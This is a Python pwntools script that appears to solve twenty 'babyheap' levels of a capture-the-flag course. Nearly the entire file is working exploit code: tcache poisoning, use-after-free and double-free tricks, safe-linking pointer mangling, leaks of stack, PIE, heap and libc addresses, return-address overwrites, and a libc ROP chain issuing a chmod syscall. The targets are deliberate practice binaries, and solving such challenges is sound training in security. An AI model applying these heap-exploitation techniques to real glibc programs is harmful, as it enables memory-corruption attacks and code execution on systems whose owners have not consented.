from pwn import *
import os
import time
import re

CHALLENGE_NAME = f"/challenge/babyheap_level{os.getenv('HOSTNAME')[-4:-2]}.{os.getenv('HOSTNAME')[-1:]}"

# malloc then free
# read flag into the freed chunk
# puts the freed chunk that points to the flag
def challenge1():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    malloc_size = b'378'
    with process([CHALLENGE_NAME], close_fds=False) as p:
        info(p.clean())
        p.sendline(b'malloc')
        p.sendline(malloc_size)
        info(p.clean())
        p.sendline(b'free')
        info(p.clean())
        p.sendline(b'read_flag')
        info(p.clean())
        p.sendline(b'puts')
        info(p.clean())
        p.sendline(b'quit')
        info(p.clean())
        p.poll(block=True)

# same as the above level
def challenge2():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    for i in range(128, (128+872)):
        malloc_size = f'{i}'.encode()
        with process([CHALLENGE_NAME], close_fds=False) as p:
            p.clean()
            p.sendline(b'malloc')
            p.sendline(malloc_size)
            p.sendline(b'free')
            p.sendline(b'read_flag')
            p.sendline(b'puts')
            p.sendline(b'quit')
            output = p.clean()
            if b'pwn' in output:
                info(output)
                break
            p.poll(block=True)

# malloc twice then free twice
# tcache has 2 entries now (entry1 -> entry0)
# flag is malloced twice
# first malloc = entry1
# second malloc = entry0
def challenge3():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    malloc_size = b'832'
    with process([CHALLENGE_NAME], close_fds=False) as p:
        p.clean()
        p.sendline(b'malloc')
        p.sendline(b'0')
        p.sendline(malloc_size)
        p.sendline(b'malloc')
        p.sendline(b'1')
        p.sendline(malloc_size)
        p.sendline(b'free')
        p.sendline(b'0')
        p.sendline(b'free')
        p.sendline(b'1')
        p.sendline(b'read_flag')
        p.sendline(b'puts')
        p.sendline(b'0')
        p.sendline(b'quit')
        info(p.clean())
        p.poll(block=True)

# malloc then free
# overwrite the key value of the tcache entry
# then you can free again (now there are 2 tcache entries)
# when the flag is read twice you now have a pointer to the flag
def challenge4():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    malloc_size = b'305'
    with process([CHALLENGE_NAME], close_fds=False) as p:
        p.clean()
        p.sendline(b'malloc')
        p.sendline(malloc_size)
        p.sendline(b'free')
        p.sendline(b'scanf')
        p.sendline(b'a'*100)
        p.sendline(b'free')
        p.sendline(b'read_flag')
        p.sendline(b'puts')
        p.sendline(b'quit')
        info(p.clean())
        p.poll(block=True)

# malloc twice then free twice (tcache->entry1->entry0)
# read the flag in so it points to entry1
# free entry1 again so the flag gets freed
# now entry1 will have a key value so puts_flag will pass
def challenge5():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    malloc_size = b'296'
    with process([CHALLENGE_NAME], close_fds=False) as p:
        p.clean()
        p.sendline(b'malloc')
        p.sendline(b'0')
        p.sendline(malloc_size)
        p.sendline(b'malloc')
        p.sendline(b'1')
        p.sendline(malloc_size)
        p.sendline(b'free')
        p.sendline(b'0')
        p.sendline(b'free')
        p.sendline(b'1')
        p.sendline(b'read_flag')
        p.sendline(b'free')
        p.sendline(b'1')
        p.sendline(b'puts_flag')
        p.sendline(b'quit')
        info(p.clean())
        p.poll(block=True)

# malloc twice then free twice
# tcache -> entry0 -> entry1
# scanf the address to overwrite into entry0 pointer
# now entry0->next = overwrite_address
# since the above entry1->address = overrwrite_address
# malloc twice, now one of the pointers points to overwrite_address
# now you can puts the secret value 
def challenge6():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    malloc_size = b'16'
    read_addr = p64(0x422961)
    with process([CHALLENGE_NAME], close_fds=False) as p:
        p.clean()
        p.sendline(b'malloc')
        p.sendline(b'0')
        p.sendline(malloc_size)
        p.sendline(b'malloc')
        p.sendline(b'1')
        p.sendline(malloc_size)
        p.sendline(b'free')
        p.sendline(b'1')
        p.sendline(b'free')
        p.sendline(b'0')
        p.sendline(b'scanf')
        p.sendline(b'0')
        p.sendline(read_addr)
        p.sendline(b'malloc')
        p.sendline(b'0')
        p.sendline(malloc_size)
        p.sendline(b'malloc')
        p.sendline(b'1')
        p.sendline(malloc_size)
        p.sendline(b'puts')
        p.sendline(b'0')
        p.sendline(b'puts')
        p.sendline(b'1')
        info(p.readuntil(b'Data: '))
        info(p.readuntil(b'Data: '))
        secret = p.readline().strip()
        p.sendline(b'send_flag')
        p.sendline(secret)
        p.sendline(b'quit')
        info(p.clean())
        p.poll(block=True)

# need to leak a secret
# malloc twice then free twice
# overwrite entry1 so that entry0 points to the first leak
# puts the entry0 after this
# do it again for the other 8 bytes to get the fill secret
def challenge7():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    malloc_size = b'16'
    read_addr1 = p64(0x42AB29)
    read_addr2 = p64(0x42AB29+8)
    with process([CHALLENGE_NAME], close_fds=False) as p:
        p.clean()
        p.sendline(b'malloc 0 16')
        p.sendline(b'malloc 1 16')
        p.sendline(b'free 0')
        p.sendline(b'free 1')
        p.sendline(b'scanf 1')
        p.sendline(read_addr2)
        p.sendline(b'malloc 0 16')
        p.sendline(b'malloc 1 16')
        p.sendline(b'puts 1')
        info(p.readuntil(b'Data: '))
        secret1 = p.readline().strip()
        p.sendline(b'malloc 0 16')
        p.sendline(b'malloc 1 16')
        p.sendline(b'free 0')
        p.sendline(b'free 1')
        p.sendline(b'scanf 1')
        p.sendline(read_addr1)
        p.sendline(b'malloc 0 16')
        p.sendline(b'malloc 1 16')
        p.sendline(b'puts 1')
        info(p.readuntil(b'Data: '))
        secret2 = p.readline().strip()
        secret = secret2+secret1
        p.sendline(b'quit')
        info(p.clean())
    with process([CHALLENGE_NAME], close_fds=False) as p:
        p.sendline(b'send_flag')
        p.sendline(secret)
        p.sendline(b'quit')
        info(p.clean())
        p.poll(block=True)

# same as level 7 but this level has whitespace armor
# pretty much just overwrite the entire secret with a's
# then send 16 a's to pass the win() check 
def challenge8():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    malloc_size = b'80'
    read_addr1 = p64(0x424B0A-64)
    read_addr2 = p64(0x424B0A+8)
    with process([CHALLENGE_NAME], close_fds=False) as p:
        p.clean()
        p.sendline(b'malloc\n0\n' + malloc_size)
        p.sendline(b'malloc\n1\n' + malloc_size)
        p.sendline(b'free\n1')
        p.sendline(b'free\n0')
        p.sendline(b'scanf\n0\n' + read_addr1)
        p.sendline(b'malloc\n0\n' + malloc_size)
        p.sendline(b'malloc\n1\n' + malloc_size)
        info(p.clean())
        p.sendline(b'scanf\n1\n' + b'a'*80)
        p.sendline(b'puts\n1')
        p.sendline(b'malloc\n0\n' + malloc_size)
        p.sendline(b'malloc\n1\n' + malloc_size)
        p.sendline(b'free\n1')
        p.sendline(b'free\n0')
        p.sendline(b'scanf\n0\n' + read_addr2)
        p.sendline(b'malloc\n0\n' + malloc_size)
        p.sendline(b'malloc\n1\n' + malloc_size)
        p.sendline(b'send_flag\n' + b'a'*16)
        p.sendline(b'quit')
        info(p.clean())
        p.poll(block=True)

# this level checks to see if the malloc address is near the secret
# 1. UAF then overwrite the secret address onto the heap
# 2. malloc twice -> will get a malloc error from the program
# 3. malloc again into any index
#    the next pointer should contain the value of secret
# 4. do it again for the second half of the secret   
def challenge9():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    malloc_size = b'80'
    read_addr1 = p64(0x426364)
    read_addr2 = p64(0x426364+8)
    with process([CHALLENGE_NAME], close_fds=False) as p:
        p.clean()
        p.sendline(b'malloc\n0\n' + malloc_size)
        p.sendline(b'malloc\n1\n' + malloc_size)
        p.sendline(b'free\n1')
        p.sendline(b'free\n0')
        p.sendline(b'scanf\n0\n' + read_addr2)
        p.sendline(b'malloc\n0\n' + malloc_size)
        p.sendline(b'malloc\n1\n' + malloc_size)
        p.sendline(b'malloc\n1\n' + malloc_size)
        p.sendline(b'free\n1')
        p.sendline(b'puts 1')
        info(p.readuntil(b'Data: '))
        secret2 = p.readline().strip()[0:8]
        p.sendline(b'malloc\n0\n' + malloc_size)
        p.sendline(b'malloc\n1\n' + malloc_size)
        p.sendline(b'free\n1')
        p.sendline(b'free\n0')
        p.sendline(b'scanf\n0\n' + read_addr1)
        p.sendline(b'malloc\n0\n' + malloc_size)
        p.sendline(b'malloc\n1\n' + malloc_size)
        p.sendline(b'malloc\n1\n' + malloc_size)
        p.sendline(b'free\n1')
        p.sendline(b'puts 1')
        info(p.readuntil(b'Data: '))
        secret1 = p.readline().strip()[0:8]
        secret = secret1+secret2
        p.sendline(b'quit')
        info(p.clean())
        p.poll(block=True)
    with process([CHALLENGE_NAME], close_fds=False) as p:
        p.sendline(b'send_flag\n' + secret)
        p.sendline(b'quit')
        info(p.clean())
        p.poll(block=True)

# leaks a stack and pie address
# 1. do a UAF and overwrite location 0 with the stack address pointer 
#    now alloc[0] points to the return address on the stack
# 2. malloc again and scanf the win address into the correct location
#    this should overwrite the return address with win  
def challenge10():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    malloc_size = b'16'
    win_offset = 253
    return_offset = 280

    # with gdb.debug([CHALLENGE_NAME], '''
    # disp/5i $rip
    # disp/40gx $rsp
    # b *main+1192
    # c
    # ''') as p:

    with process([CHALLENGE_NAME], close_fds=False) as p:
        info(p.readuntil(b'is at: '))
        stack_leak = int(p.readlineb().strip().decode()[:-1], 16)
        info(p.readuntil(b'is at: '))
        address_of_main = int(p.readlineb().strip().decode()[:-1], 16)
        print(f'stack: {hex(stack_leak)}, main: {hex(address_of_main)}')
        win = address_of_main - win_offset
        return_address = stack_leak + 280
        info(p.clean())
        p.sendline(b'malloc\n0\n' + malloc_size)
        p.sendline(b'malloc\n1\n' + malloc_size)
        p.sendline(b'free\n1')
        p.sendline(b'free\n0')
        p.sendline(b'scanf\n0\n' + p64(return_address))
        p.sendline(b'malloc\n0\n' + malloc_size)
        p.sendline(b'malloc\n1\n' + malloc_size)
        p.sendline(b'scanf\n1\n' + p64(win))
        p.sendline('quit\n')
        info(p.clean())
        p.poll(block=True)

# 1. perform a UAF
# 2. use echo to leak "/bin/echo" (located in .rodata so it is a pie addr)
# 3. use echo to leak "Data: " (located on the stack so it is a stack addr)
#   How does echo work?
#   mallocs then stores a pie and stack address onto the heap
#   so if you UAF then you can have access to these addresses
# 4. UAF to make one of the addresses point to the return address
# 5. overwrite this address with the win address  
def challenge11():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    malloc_size = b'32'
    win_offset = 3088
    return_offset = 374

    # with gdb.debug([CHALLENGE_NAME], '''
    # disp/5i $rip
    # disp/40gx $rsp
    # b echo
    # c
    # ''') as p:

    with process([CHALLENGE_NAME], close_fds=False) as p:
        info(p.clean())
        p.sendline(b'malloc\n0\n' + malloc_size)
        info(p.clean())
        p.sendline(b'free\n0')
        info(p.clean())
        p.sendline(b'echo\n0\n0')
        info(p.readuntil(b'Data: '))
        pie_leak = int.from_bytes(p.readlineb().strip(), 'little')
        p.sendline(b'echo\n0\n8')
        info(p.readuntil(b'Data: '))
        stack_leak = int.from_bytes(p.readlineb().strip(), 'little')
        print(f'pie leak: {hex(pie_leak)}, stack leak: {hex(stack_leak)}')
        win = pie_leak - win_offset
        return_address = stack_leak + return_offset
        info(p.clean())
        p.sendline(b'malloc\n0\n' + malloc_size)
        info(p.clean())
        p.sendline(b'malloc\n1\n' + malloc_size)
        info(p.clean())
        p.sendline(b'free\n1')
        info(p.clean())
        p.sendline(b'free\n0')
        info(p.clean())
        p.sendline(b'scanf\n0\n' + p64(return_address))
        info(p.clean())
        p.sendline(b'malloc\n0\n' + malloc_size)
        info(p.clean())
        p.sendline(b'malloc\n1\n' + malloc_size)
        info(p.clean())
        p.sendline(b'scanf\n1\n' + p64(win))
        info(p.clean())
        p.sendline('quit\n')
        info(p.clean())
        p.poll(block=True)

# 1. stack_malloc_win -> mallocs some random address from the heap
#   how stack_malloc_win works -> 
#   checks if the malloced address == some stack address
#   if it does then it calls win
# 2. stack_scanf -> scanf fake metadata into the stack address that is checked
# 3. stack_free -> frees the stack address successfully since there is metadata
# 4. stack_malloc_win -> now the tcache address will equal the correct address
def challenge12():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    padding = b'a'*48
    malloc_prev_size = p64(0x00)
    malloc_size = p64(0x61)

    # with gdb.debug([CHALLENGE_NAME], '''
    # disp/5i $rip
    # disp/40gx $rsp
    # b *main+1556
    # c
    # ''') as p:

    with process([CHALLENGE_NAME], close_fds=False) as p:
        info(p.clean())
        p.sendline(b'stack_malloc_win')
        info(p.clean())
        p.sendline(b'stack_scanf\n' + padding + malloc_prev_size + malloc_size)
        info(p.clean())
        p.sendline(b'stack_free')
        info(p.clean())
        p.sendline(b'stack_malloc_win')
        info(p.clean())
        p.poll(block=True)       


# 1. make a fake tcachhe entry using stack_scanf
# 2. stack_free since it will work using the metadata
# 3. malloc and the address from the tcache will be the stack address
# 4. just overwrite the secret with a bunch of a's 
# 5. call send_flag and send 16 a's to call win
def challenge13():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    padding = b'a'*48
    tcache_prev_size = p64(0x00)
    tcache_size = p64(0xc1)
    payload = b'a'*180
    secret = b'a'*16
    malloc_size = b'170'

    # with gdb.debug([CHALLENGE_NAME], '''
    # disp/5i $rip
    # disp/40gx $rsp
    # b *main+1556
    # c
    # ''') as p:

    with process([CHALLENGE_NAME], close_fds=False) as p:
        info(p.clean())
        p.sendline(b'stack_scanf\n' + padding + tcache_prev_size + tcache_size)
        info(p.clean())
        p.sendline(b'stack_free')
        info(p.clean())
        p.sendline(b'malloc 0 ' + malloc_size)
        info(p.clean())
        p.sendline(b'scanf 0\n' + payload)
        info(p.clean())
        p.sendline(b'send_flag\n' + secret)
        info(p.clean())
        p.sendline(b'quit')
        info(p.clean())
        p.poll(block=True)

# 1. UAF then echo the pie address of "/bin/echo"
# 2. stack_scanf and make a fake tcache entry then stack_free
# 3. malloc -> this should point to the stack address
# 4. echo the stack address at the 64th offset and it should leak a stack address
# 5. do a UAF to overwrite the return address with the address of win 
def challenge14():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    malloc_size = b'32'
    win_offset = 6614
    return_offset = 232
    padding = b'a'*48
    tcache_prev_size = p64(0x00)
    tcache_size = p64(0x31)
    stack_offset = b'64'

    # with gdb.debug([CHALLENGE_NAME], '''
    # disp/5i $rip
    # disp/40gx $rsp
    # b echo
    # c
    # ''') as p:

    with process([CHALLENGE_NAME], close_fds=False) as p:
        info(p.clean())
        p.sendline(b'malloc 0 ' + malloc_size)
        info(p.clean())
        p.sendline(b'free 0')
        info(p.clean())
        p.sendline(b'echo 0 0')
        info(p.readuntil(b'Data: '))
        pie_leak = int.from_bytes(p.readlineb().strip(), 'little')
        p.sendline(b'stack_scanf\n' + padding + tcache_prev_size + tcache_size)
        info(p.clean())
        p.sendline(b'stack_free')
        info(p.clean())
        p.sendline(b'malloc 0 ' + malloc_size)
        info(p.clean())
        p.sendline(b'echo 0 ' + stack_offset)
        info(p.readuntil(b'Data: '))
        stack_leak = int.from_bytes(p.readlineb().strip(), 'little')
        print(f'pie leak: {hex(pie_leak)}, stack leak: {hex(stack_leak)}')
        win = pie_leak - win_offset
        return_address = stack_leak - return_offset
        info(p.clean())
        p.sendline(b'malloc 0 ' + malloc_size)
        info(p.clean())
        p.sendline(b'malloc 1 ' + malloc_size)
        info(p.clean())
        p.sendline(b'free 1')
        info(p.clean())
        p.sendline(b'free 0')
        info(p.clean())
        p.sendline(b'scanf 0 ' + p64(return_address))
        info(p.clean())
        p.sendline(b'malloc 0 ' + malloc_size)
        info(p.clean())
        p.sendline(b'malloc 1 ' + malloc_size)
        info(p.clean())
        p.sendline(b'scanf 1 ' + p64(win))
        info(p.clean())
        p.sendline('quit')
        info(p.clean())
        p.poll(block=True)


# all checksec things are on
# we have echo that has a stack leak and a pie leak
# free zeros out the memory location so UAF is useless
# to use echo to leak data you need to have a pointer,
# that is the same as the one used for the malloc in echo
# you can echo a pie and stack address using offsets 32 and 40
# now how to overwrite -> just use read to overwrite tache contents
def challenge15():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    malloc_size = b'16'

    # with gdb.debug([CHALLENGE_NAME], '''
    # disp/5i $rip
    # disp/40gx $rsp
    # b read@plt
    # b echo
    # c
    # ''') as p:

    with process([CHALLENGE_NAME], close_fds=False) as p:
        info(p.clean())
        p.sendline(b'malloc 0 ' + malloc_size)
        info(p.clean())
        # leak the data using echo
        # offset 32 is a pie address
        # offset 40 is a stack address
        p.sendline(b'echo 0 32')
        info(p.readuntil(b'Data: '))
        pie_addr = int.from_bytes(p.readline().strip(), 'little')
        print(hex(pie_addr))
        p.sendline(b'echo 0 40')
        info(p.readuntil(b'Data: '))
        stack_addr = int.from_bytes(p.readline().strip(), 'little')
        print(hex(stack_addr))
        return_address = stack_addr + 22
        win = pie_addr - 3344
        print(f'win = {hex(win)}')
        print(f'ret = {hex(return_address)}')
        # malloc 3 times to get a new heap
        p.sendline(b'malloc 0 16')
        p.sendline(b'malloc 1 16')
        p.sendline(b'malloc 2 16')
        # free is reverse order because of how tcache is
        p.sendline(b'free 2')
        p.sendline(b'free 1')
        # overwrite the next pointer with the return address
        # also need to preserve the metadata 
        p.sendline(b'read 0 40')
        p.send(b'a'*16 + p64(0x00) + p64(0x21) + p64(return_address))
        p.sendline(b'malloc 1 16')
        p.sendline(b'malloc 2 16')
        # now malloc 2 should point to the return address
        p.sendline(b'read 2 8')
        # overwrite the return address with win
        p.send(p64(win))
        info(p.clean())
        p.sendline('quit')
        info(p.clean())
        p.poll(block=True)

# this is level 9 but with safe-linking
# 1. leak a heap address for mangling
# 2. mangle the secret address add it to the tcache
# 3. leak the secret
# 4. demangle the first 8 bytes of the secret
#   - demangle from the heap address first
#   - demangle from the secret address second
# 5. second 8 bytes of the secret should be nulled so you now have the full secret
def challenge16():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    secret_addr = 0x424060

    # with gdb.debug([CHALLENGE_NAME], '''
    # disp/5i $rip
    # disp/40gx $rsp
    # b *0x401B8B
    # c
    # ''') as p:

    with process([CHALLENGE_NAME], close_fds=False) as p:
        info(p.clean())
        p.sendline(b'malloc 0 16')
        p.sendline(b'malloc 1 16')
        p.sendline(b'malloc 2 16')
        p.sendline(b'free 2')
        p.sendline(b'free 0')
        p.sendline(b'free 1')
        p.sendline(b'puts 1')
        info(p.readuntil(b'Data: '))
        heap_leak = int.from_bytes(p.readline().strip(), 'little')
        print(hex(heap_leak >> 12))
        read_addr1 = p64(secret_addr ^ (heap_leak >> 12) - 1)
        info(p.clean())
        p.sendline(b'scanf 1 ' + read_addr1)
        info(p.clean())
        p.sendline(b'malloc 0 16')
        p.sendline(b'malloc 1 16')
        p.sendline(f'free 0')
        p.sendline(f'puts 0')
        info(p.readuntil(b'Data: '))
        secret2 = p.readline().strip()
        print(f'secret = {secret2}')
        secret = int.from_bytes(secret2[0:8], "little") ^ (heap_leak >> 12)
        secret = secret ^ (secret_addr >> 12) 
        secret = (secret + 1).to_bytes(8, 'little')
        p.sendline(b'send_flag\n' + secret)       
        p.sendline(b'quit')
        info(p.clean())
        p.poll(block=True)

def demangle(ptr):
    middle = ptr ^ (ptr >> 12)
    return (middle ^ (middle >> 24))

def mangle(pos, ptr):
    return ((pos >> 12) ^ ptr)

# same as challenge 10 with safe-linking
# cannot do it the same as challenge 10 because the saved rip ends in 8
# 1. get heap leak
# 2. mangle the alloc leak
# 3. make one of the allocations point to the alloc leak
# 4. deref the alloc leak and write the return address to that location
# 5. now the start of the alloc array should hold the return address
# 6. overwrite the return address with win
def challenge17():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    return_offset = 0x168

    # with gdb.debug([CHALLENGE_NAME], '''
    # disp/5i $rip
    # disp/40gx $rsp
    # b *main+1357
    # c
    # ''') as p:

    with process([CHALLENGE_NAME], close_fds=False) as p:
        # get the address of win and the address of saved rip
        info(p.readuntil(b'is at: '))
        stack_leak = int(p.readlineb().strip().decode()[:-1], 16)
        info(p.readuntil(b'is at: '))
        address_of_main = int(p.readlineb().strip().decode()[:-1], 16)
        print(f'stack: {hex(stack_leak)}, main: {hex(address_of_main)}')
        binary.address = address_of_main - binary.symbols['main']
        return_address = stack_leak + return_offset

        info(p.clean())
        # get a heap leak
        p.sendline(b'malloc 1 32')
        p.sendline(b'malloc 2 32')
        p.sendline(b'free 1')
        p.sendline(b'free 2')
        p.sendline(b'puts 2')
        info(p.readuntil(b'Data: '))
        heap_leak = demangle(int.from_bytes(p.readline().strip(), 'little'))
        mangled_alloc_address = mangle(heap_leak, stack_leak)
        # set the second index to be the start of the alloc array
        p.sendline(b'scanf 2 ' + p64(mangled_alloc_address))
        # malloc twice, second index should point to the alloc address from above
        p.sendline(b'malloc 1 32')
        p.sendline(b'malloc 2 32')
        # this makes alloc[0] = return address
        p.sendline(b'scanf 2 ' + p64(return_address))
        # deref alloc[0] to overwrite the return address with win
        p.sendline(b'scanf 0 ' + p64(binary.symbols['win']))
        p.sendline(b'quit')
        info(p.clean())
        p.poll(block=True)

def challenge18():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    padding = b'a'*48
    tcache_prev_size = p64(0x00)
    tcache_size = p64(0xc1)
    payload = b'a'*180
    secret = b'a'*16
    malloc_size = b'170'

    # with gdb.debug([CHALLENGE_NAME], '''
    # disp/5i $rip
    # disp/40gx $rsp
    # b *main+1357
    # c
    # ''') as p:

    with process([CHALLENGE_NAME], close_fds=False) as p:
        info(p.clean())
        p.sendline(b'stack_scanf\n' + padding + tcache_prev_size + tcache_size)
        info(p.clean())
        p.sendline(b'stack_free')
        info(p.clean())
        p.sendline(b'malloc 0 ' + malloc_size)
        info(p.clean())
        p.sendline(b'scanf 0\n' + payload)
        info(p.clean())
        p.sendline(b'send_flag\n' + secret)
        info(p.clean())
        p.sendline(b'quit')
        info(p.clean())
        p.poll(block=True)

# introduced safe write and safe read
# use overlapping allocations to read out the flag that is in memory
def challenge19():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    

    # with gdb.debug([CHALLENGE_NAME], '''
    # disp/5i $rip
    # disp/40gx $rsp
    # b *main+1357
    # c
    # ''') as p:

    with process([CHALLENGE_NAME], close_fds=False) as p:
        info(p.clean())
        # heap will look like
        # [META|ALLOC(32)][META|ALLOC(32)][META|ALLOC(978)]
        p.sendline(b'malloc 1 32')
        p.sendline(b'malloc 2 32')
        p.sendline(b'read_flag')
        p.sendline(b'safe_read 1')
        # read into alloc(1) and overwrite the metadata of alloc(2)
        # 0x71 will allow for a size of 90 bytes
        p.send(b'a'*32 + p64(0x00) + p64(0x71))
        # free the allocation with corrupted metadata so it is in the tcache
        p.sendline(b'free 2')
        # malloc again and get the chunk from the tcache
        p.sendline(b'malloc 3 90')
        # the chunk overlaps with the flag that was read into memory
        # so you can just write the flag out now
        p.sendline(b'safe_write 3')
        info(p.clean())
        p.poll(block=True)
        # 0x7ffe157ffc58

# look at the comments for this one
# it has no leaks so you need to leak libc
# then you can leak a stack address using the libc address
# then you need to leak a heap address
# then you can do the same thing as 18 to overwrite rip
# there is no win function so rip will point to a rop chain
def challenge20():
    libc = ELF(f"/challenge/lib/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    
    
    # with gdb.debug([CHALLENGE_NAME], '''
    # disp/5i $rip
    # disp/40gx $rsp
    # b fwrite@plt
    # c
    # c
    # c
    # ''') as p:

    with process([CHALLENGE_NAME], close_fds=False) as p:
        info(p.clean())
        # malloc 100 bytes to set the length for later 
        p.sendline(b'malloc 0 100')
        # leak a heap address and the address of libc
        p.sendline(b'malloc 1 32')
        p.sendline(b'malloc 2 32')
        p.sendline(b'safe_write 1')
        p.sendline(b'safe_read 1')
        # you can leak stuff my using overlapping allocaions
        p.send(b'a'*32 + p64(0x00) + p64(0x161))
        info(p.clean())
        # free here to add to the 0x161 tcache when actual size is just 32 bytes
        p.sendline(b'free 2')
        p.sendline(b'malloc 3 344')
        info(p.clean())
        p.sendline(b'safe_write 3')



        info(p.readuntil(b'Index: \n'))
        leak = int.from_bytes(p.readline().strip(), 'little')
        print(hex(leak))
        
        file_address = int(hex(leak)[146:158], 16) - 240
        io_file_jumps = int(hex(leak)[34:46], 16)

        print(hex(file_address))
        print(hex(io_file_jumps))

        libc.address = io_file_jumps - libc.symbols['_IO_file_jumps']
        print(hex(libc.address))
        # obtain this value using 'scan libc stack' in gef
        stack_leak = libc.address+0x21aa20

        # set the next pointer of one of the allocations to be the stack_leak
        p.sendline(b'malloc 4 32')
        p.sendline(b'malloc 5 32')
        p.sendline(b'malloc 6 32')
        p.sendline(b'safe_read 4')
        p.send(b'a'*32 + p64(0x00) + p64(0x61))
        p.sendline(b'free 5')
        p.sendline(b'malloc 7 85')
        p.sendline(b'free 4')
        p.sendline(b'free 6')
        p.sendline(b'safe_read 7')
        payload = b'a'*32 + p64(0x00) + p64(0x61) + p64(mangle(file_address, stack_leak))
        p.send(payload)
        p.sendline(b'malloc 8 35')
        p.sendline(b'malloc 9 35')
        info(p.clean())
        p.sendline(b'safe_write 9')
        info(p.readuntil(b'Index: \n'))
        # should leak a value from the stack for you
        leak = int.from_bytes(p.readline().strip(), 'little')
        print(hex(leak))
        # now you have the location of alloc[0] and rip
        rip = int(hex(leak), 16) - 272
        alloc = int(hex(leak), 16) - 680
        info(p.clean())
        print(f'RIP is {hex(rip)}')
        # now you can do overlapping again to overwrite the allocation address into memory
        p.sendline(b'malloc 4 16')
        p.sendline(b'malloc 5 16')
        p.sendline(b'malloc 6 16')
        p.sendline(b'safe_read 4')
        info(p.clean())
        p.send(b'a'*16 + p64(0x00) + p64(0x61))
        p.sendline(b'free 5')
        p.sendline(b'malloc 7 85')
        p.sendline(b'free 4')
        p.sendline(b'free 6')
        p.sendline(b'safe_read 7')
        payload = b'a'*16 + p64(0x00) + p64(0x61) + p64(mangle(file_address, alloc))
        p.send(payload)
        p.sendline(b'malloc 8 16')
        p.sendline(b'malloc 9 16')
        info(p.clean())


        # lastly overwrite alloc[0] with the return address
        # this is like level18
        p.sendline(b'safe_write 3')
        # print(f'alloc = {hex(alloc)}')
        info(p.clean())
        p.sendline(b'safe_read 9') 
        p.send(p64(rip))
        p.sendline(b'safe_read 0')
        # then send a ropchain 
        rop = ROP(libc)
        pop_rax = p64(rop.find_gadget(['pop rax', 'ret']).address)
        pop_rdi = p64(rop.find_gadget(['pop rdi', 'ret']).address)
        pop_rsi = p64(rop.find_gadget(['pop rsi', 'ret']).address)
        syscall = p64(rop.find_gadget(['syscall', 'ret']).address)
        trash_string = p64(next(libc.search(b'libc_intl_domainname')))
        rop_chain = pop_rax+p64(90)+pop_rdi+trash_string+pop_rsi+p64(0x9ed)+syscall
        p.send(rop_chain)
        p.sendline(b'safe_write 3')
        p.sendline(b'quit')
        info(p.clean())
        p.poll(block=True)

def main():
    context.arch = 'amd64'
    context.encoding ='latin'
    context.log_level = 'INFO'
    context.terminal = ["tmux", "splitw", "-h"]
    warnings.simplefilter('ignore')
    challenge20()


if __name__ == "__main__":
    main()


    

# with gdb.debug([CHALLENGE_NAME], '''
    # disp/5i $rip
    # disp/40gx $rsp
    # b *main+693
    # b *main+432
    # ''') as p:
    

# core = Coredump('./core')
# print(core)


    